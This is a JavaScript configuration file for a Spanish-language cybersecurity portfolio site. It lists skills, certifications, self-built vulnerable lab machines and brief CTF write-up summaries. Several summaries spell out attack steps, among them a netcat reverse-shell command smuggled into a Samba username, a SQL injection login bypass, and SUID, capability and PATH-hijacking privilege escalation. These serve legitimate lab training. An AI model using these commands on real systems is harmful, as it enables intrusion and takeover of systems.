/**
 * =========================================================================
 * PORTFOLIO DATA CONFIGURATION
 * =========================================================================
 * Edita este archivo para actualizar tu información personal, certificaciones,
 * máquinas creadas, CTFs resueltos, habilidades y proyectos.
 * ¡No necesitas tocar el código HTML ni CSS para añadir nuevo contenido!
 */

const portfolioData = {
    // ---------------------------------------------------------------------
    // INFORMACIÓN PERSONAL Y REDES
    // ---------------------------------------------------------------------
    personal: {
        name: "Miki",
        handle: "mikisbd",
        title: "Cybersecurity Analyst & Ethical Hacker",
        subtitle: "Apasionado del Pentesting, Red Team, Creación de Laboratorios y Análisis de Vulnerabilidades",
        location: "España",
        status: "Disponible para oportunidades / Nuevos retos",
        avatar: "https://avatars.githubusercontent.com/u/20459933?v=4", // Tu avatar de GitHub
        bio: `¡Hola! Soy un entusiasta de la ciberseguridad enfocado en seguridad ofensiva, pruebas de penetración y resolución de retos CTF. Disfruto analizando vectores de ataque, diseñando máquinas vulnerables para la comunidad y profundizando en la explotación tanto en entornos Linux como Active Directory / Windows.

Constantemente aprendiendo y perfeccionando habilidades en metodologías de hacking ético, evasión de defensas y scripting para automatización.`,
        cvUrl: "#", // Enlace a tu CV en PDF (ej: "./assets/CV_Miki.pdf" o enlace a Google Drive/Dropbox)
        social: {
            github: "https://github.com/mikisbd",
            linkedin: "https://www.linkedin.com/in/", // Añade tu perfil de LinkedIn
            hackthebox: "https://app.hackthebox.com/profile/", // Tu ID de HTB
            tryhackme: "https://tryhackme.com/p/", // Tu usuario de THM
            dockerlabs: "https://dockerlabs.es/", // Tu perfil o enlace a Dockerlabs
            email: "mailto:tu-correo@example.com"
        },
        stats: {
            ctfsSolved: "+50",
            machinesCreated: "3+",
            certificationsCount: "2+",
            yearsExp: "2+ años"
        }
    },

    // ---------------------------------------------------------------------
    // HABILIDADES Y ARSENAL TÉCNICO
    // ---------------------------------------------------------------------
    skillCategories: [
        {
            category: "Seguridad Ofensiva & Pentesting",
            icon: "fa-skull-crossbones",
            skills: [
                { name: "Web Application Pentesting (OWASP Top 10)", level: 85 },
                { name: "Linux Privilege Escalation", level: 90 },
                { name: "Windows / Active Directory Attacks", level: 75 },
                { name: "Network Enumeration & Scanning", level: 95 },
                { name: "Exploit Research & Adaptation", level: 80 }
            ]
        },
        {
            category: "Herramientas de Pentesting",
            icon: "fa-toolbox",
            tags: [
                "Nmap", "Burp Suite", "Metasploit", "Wireshark", "John The Ripper",
                "Hashcat", "Hydra", "Gobuster", "Feroxbuster", "Sqlmap",
                "Impacket", "BloodHound", "CrackMapExec / NetExec"
            ]
        },
        {
            category: "Desarrollo & Scripting",
            icon: "fa-code",
            skills: [
                { name: "Bash Scripting (Automatización)", level: 90 },
                { name: "Python (Exploits & Scrapers)", level: 80 },
                { name: "HTML / CSS / JavaScript", level: 75 },
                { name: "Docker / Creación de Contenedores", level: 85 }
            ]
        },
        {
            category: "Sistemas & Entornos",
            icon: "fa-server",
            tags: [
                "Kali Linux", "Parrot OS", "Ubuntu / Debian", "Arch Linux",
                "Windows Server", "Active Directory", "Docker", "VirtualBox / VMware"
            ]
        }
    ],

    // ---------------------------------------------------------------------
    // CERTIFICACIONES
    // ---------------------------------------------------------------------
    certifications: [
        {
            id: "cert-1",
            title: "eJPTv2 (eLearnSecurity Junior Penetration Tester)",
            issuer: "INE Security",
            date: "2024",
            status: "Completada", // "Completada" o "En curso"
            badge: "https://images.credly.com/size/340x340/images/e8cda1a0-d44b-4c28-86d1-447a16f1947e/image.png",
            verifyUrl: "#",
            description: "Evaluación práctica 100% real sobre reconocimiento, escaneo, análisis de vulnerabilidades web/red y explotación de sistemas."
        },
        {
            id: "cert-2",
            title: "Certified Ethical Hacker / Security+",
            issuer: "CompTIA / EC-Council",
            date: "2023",
            status: "Completada",
            badge: "https://images.credly.com/size/340x340/images/00634f82-b07f-4bbd-a6bb-53778754a3a6/image.png",
            verifyUrl: "#",
            description: "Fundamentos sólidos de ciberseguridad, gestión de amenazas, arquitectura segura y respuesta ante incidentes."
        },
        {
            id: "cert-3",
            title: "CPTS / OSCP (Offensive Security Certified Professional)",
            issuer: "OffSec / Hack The Box Academy",
            date: "2025",
            status: "En preparación",
            badge: "https://images.credly.com/size/340x340/images/b6f481c7-7a52-4752-87eb-1f3eb1a9e332/image.png",
            verifyUrl: "#",
            description: "Entrenamiento intensivo en metodologías avanzadas de pentesting, pivoting de redes y evasión de defensas."
        }
    ],

    // ---------------------------------------------------------------------
    // MÁQUINAS CREADAS (LABS / VULNHUB / DOCKERLABS)
    // ---------------------------------------------------------------------
    createdMachines: [
        {
            id: "mach-1",
            title: "ShadowLeak",
            platform: "Dockerlabs",
            difficulty: "Media", // Fácil, Media, Difícil, Insane
            os: "Linux",
            releaseDate: "2024",
            tags: ["LFI", "Log Poisoning", "Sudo Privilege Escalation", "Docker"],
            shortDescription: "Máquina diseñada con un vector de entrada web vía inclusión local de archivos (LFI) que deriva en RCE por envenenamiento de logs y escalada mediante binario mal configurado.",
            downloadUrl: "https://dockerlabs.es",
            writeupUrl: "#writeup-shadowleak",
            fullDetails: {
                scenario: "Entorno corporativo que hospeda un servicio interno de visualización de bitácoras y diagnóstico de servidores.",
                attackVector: "El parámetro `page` del portal web no sanitiza correctamente la ruta. Mediante Log Poisoning en `/var/log/apache2/access.log` se obtiene una web shell interactiva.",
                privilegeEscalation: "Inspección de `sudo -l` revela permisos para ejecutar un script en python sin contraseña. Vulnerable a Library Hijacking en módulo local.",
                flagUser: "user{f73a9e...}",
                flagRoot: "root{b9210c...}"
            }
        },
        {
            id: "mach-2",
            title: "InfiltrateBox",
            platform: "Dockerlabs",
            difficulty: "Fácil",
            os: "Linux",
            releaseDate: "2024",
            tags: ["FTP Anonymous", "Brute Force", "SUID Abuse", "Capabilities"],
            shortDescription: "Laboratorio introductorio ideal para principiantes: enumeración de servicios sin autenticación y explotación de permisos SUID especiales.",
            downloadUrl: "https://dockerlabs.es",
            writeupUrl: "#writeup-infiltratebox",
            fullDetails: {
                scenario: "Servidor de archivos FTP de una pequeña startup con políticas de credenciales débiles.",
                attackVector: "Acceso anónimo al servicio FTP que contiene un backup de configuración con credenciales en texto plano para SSH.",
                privilegeEscalation: "Búsqueda de binarios con capabilities configuradas (`getcap -r / 2>/dev/null`), explotando `python3 cap_setuid+ep` para spawnear una shell de root.",
                flagUser: "user{1a2b3c...}",
                flagRoot: "root{4d5e6f...}"
            }
        },
        {
            id: "mach-3",
            title: "CorpHQ",
            platform: "VulnHub",
            difficulty: "Difícil",
            os: "Linux / AD",
            releaseDate: "2024",
            tags: ["SQLi Error-based", "JWT Tampering", "Kernel Exploit / Cronjob"],
            shortDescription: "Entorno más complejo que involucra inyecciones SQL ciegas, falsificación de tokens JWT para evasión de roles de administración y secuestro de cronjobs.",
            downloadUrl: "https://www.vulnhub.com",
            writeupUrl: "#writeup-corphq",
            fullDetails: {
                scenario: "Portal de gestión de empleados con autenticación basada en JWT y base de datos relacional.",
                attackVector: "Inyección SQL en endpoint de búsqueda para extraer la clave secreta débil del JWT. Modificación de claims para obtener rol `admin` y subida de archivo php malicioso.",
                privilegeEscalation: "Monitoreo con pspy revela una tarea cron ejecutada periódicamente por root con permisos de escritura en un script dependiente.",
                flagUser: "user{99ee11...}",
                flagRoot: "root{00aa22...}"
            }
        }
    ],

    // ---------------------------------------------------------------------
    // CTFS Y MÁQUINAS RESUELTAS (WRITEUPS)
    // ---------------------------------------------------------------------
    resolvedCTFs: [
        {
            id: "ctf-1",
            title: "Lame",
            platform: "Hack The Box",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "Network / Samba",
            tags: ["Samba", "CVE-2007-2447", "Easy Root"],
            summary: "Máquina histórica de Hack The Box con una clásica vulnerabilidad en el servicio Samba 3.0.20 `usermap script`.",
            writeup: {
                recon: "Escaneo Nmap detectando puertos 21 (vsftpd 2.3.4), 22 (SSH), 139 y 445 (Samba 3.0.20-Debian).",
                initialAccess: "Explotación del CVE-2007-2447 enviando un payload a través de `smbclient` con comando intercalado en el nombre de usuario (`nohup nc -e /bin/sh <IP> <PORT>`).",
                privilegeEscalation: "El exploit del servicio Samba se ejecuta directamente en el contexto del usuario root (uid=0).",
                keyTakeaways: "Importancia de mantener servicios SMB actualizados y deshabilitar configuraciones obsoletas de compatibilidad."
            }
        },
        {
            id: "ctf-2",
            title: "Blue",
            platform: "Hack The Box",
            difficulty: "Fácil",
            os: "Windows",
            date: "2024",
            category: "EternalBlue / SMB",
            tags: ["MS17-010", "EternalBlue", "Windows 7"],
            summary: "Resolución de la célebre vulnerabilidad EternalBlue (MS17-010) en Windows 7 sin herramientas automáticas (script Python manual).",
            writeup: {
                recon: "Escaneo Nmap mostrando puertos 135, 139 y 445 abiertos con OS Windows 7 Professional 7601 Service Pack 1.",
                initialAccess: "Uso del script de detección `smb-vuln-ms17-010.nse` confirmando vulnerabilidad. Explotación con script en Python generando shellcode con msfvenom para obtener reverse shell.",
                privilegeEscalation: "MS17-010 otorga ejecución remota de código directamente como `NT AUTHORITY\\SYSTEM`.",
                keyTakeaways: "El parcheado de protocolos SMBv1 es crítico en cualquier infraestructura de red corporativa."
            }
        },
        {
            id: "ctf-3",
            title: "Pickle Rick",
            platform: "TryHackMe",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "Web / Command Injection",
            tags: ["Web Pentesting", "Command Injection", "Sudo Nopasswd"],
            summary: "CTF temático de Rick and Morty enfocado en descubrimiento web, evasión de filtros en ejecución de comandos y escalada de privilegios simple.",
            writeup: {
                recon: "Revisión del código fuente del portal web que revela el usuario `R1ckRul3s` en comentarios HTML y credencial en `/robots.txt`.",
                initialAccess: "Panel de comandos web `/portal.php` con bypass de palabras prohibidas como `cat` usando `less`, `tac` o `base64` para leer los ingredientes.",
                privilegeEscalation: "Ejecución de `sudo -l` muestra `(ALL) NOPASSWD: ALL`. Ejecutar `sudo /bin/bash` otorga acceso instantáneo como root.",
                keyTakeaways: "Nunca dejar credenciales o nombres de usuario comentados en el frontend."
            }
        },
        {
            id: "ctf-4",
            title: "Ignite",
            platform: "TryHackMe",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "CMS Vulnerability",
            tags: ["Fuel CMS", "CVE-2018-16763", "RCE"],
            summary: "Explotación de vulnerabilidad de ejecución remota de código en Fuel CMS 1.4 y extracción de credenciales de base de datos.",
            writeup: {
                recon: "Descubrimiento de Fuel CMS versión 1.4 en el puerto 80 vía análisis de cabeceras y robots.txt.",
                initialAccess: "Explotación de CVE-2018-16763 mediante inyección de PHP en la URL del CMS, obteniendo ejecución arbitraria y reverse shell como `www-data`.",
                privilegeEscalation: "Revisión de `database.php` donde se localiza la contraseña de root de MySQL/sistema reutilizada en la cuenta local de root.",
                keyTakeaways: "La reutilización de contraseñas entre bases de datos y la cuenta de superusuario del sistema es un riesgo severo."
            }
        },
        {
            id: "ctf-5",
            title: "Sau",
            platform: "Hack The Box",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "SSRF & CVE-2023-38646",
            tags: ["SSRF", "Request Baskets", "Maltrail", "Systemctl"],
            summary: "Encadenamiento de SSRF en Request Baskets (CVE-2023-27163) para acceder a un Maltrail interno y escalar vía sudo systemctl status.",
            writeup: {
                recon: "Puerto 55555 abierto con la utilidad `Request Baskets v1.2.1`.",
                initialAccess: "SSRF hacia el puerto local 80 mediante proxy forward en Request Baskets exponiendo Maltrail v0.54. Explotación de inyección de comandos en el parámetro username.",
                privilegeEscalation: "El usuario puma tiene permiso de `sudo systemctl status maltrail`. Salida interactiva en less permite spawnear shell con `!sh`.",
                keyTakeaways: "Pivoting local a través de servicios que solo escuchan en 127.0.0.1 mediante fallas de SSRF."
            }
        },
        {
            id: "ctf-6",
            title: "Vaccine",
            platform: "Dockerlabs",
            difficulty: "Media",
            os: "Linux",
            date: "2024",
            category: "Web & SUID",
            tags: ["SQLi", "Apache", "Path Hijacking"],
            summary: "Laboratorio en Dockerlabs enfocado en SQL Injection en formulario de login y escalada mediante manipulación del $PATH en script con SUID.",
            writeup: {
                recon: "Reconocimiento de servicios web con Apache y MySQL.",
                initialAccess: "Autenticación bypass en formulario vulnerable a SQL Injection `' OR 1=1 -- -` que permite subir un fichero PHP malicioso al dashboard.",
                privilegeEscalation: "Binario SUID personalizado que llama al comando `tar` de forma relativa. Modificación del PATH para ejecutar un binario `tar` falso que genera una /bin/bash con SUID.",
                keyTakeaways: "Siempre usar rutas absolutas al invocar binarios dentro de ejecutables con bits SUID asignados."
            }
        }
    ],

    // ---------------------------------------------------------------------
    // PROYECTOS Y ARSENAL DE TOOLS
    // ---------------------------------------------------------------------
    projects: [
        {
            title: "nmip1",
            category: "Scripting / Herramienta",
            description: "Script de automatización en Bash para escaneo ágil y estructurado de puertos y servicios con Nmap, optimizado para flujos de trabajo CTF y reconocimiento rápido.",
            tags: ["Bash", "Nmap", "Automation", "Recon"],
            githubUrl: "https://github.com/mikisbd/nmip1"
        },
        {
            title: "Custom CTF Vulnerable Labs",
            category: "Entornos Vulnerables",
            description: "Serie de máquinas virtuales y contenedores Docker diseñados específicamente para entrenamiento en técnicas de explotación Web y escalada de privilegios.",
            tags: ["Docker", "Linux", "Vulnerabilities", "CTF"],
            githubUrl: "https://github.com/mikisbd"
        },
        {
            title: "PrivEsc & Recon Cheatsheet",
            category: "Recursos / Docs",
            description: "Recopilación exhaustiva de comandos, técnicas de enumeración rápida en Linux/Windows y vectores habituales de escalada de privilegios.",
            tags: ["Cheatsheet", "PrivEsc", "Linux", "Windows"],
            githubUrl: "https://github.com/mikisbd"
        }
    ]
};
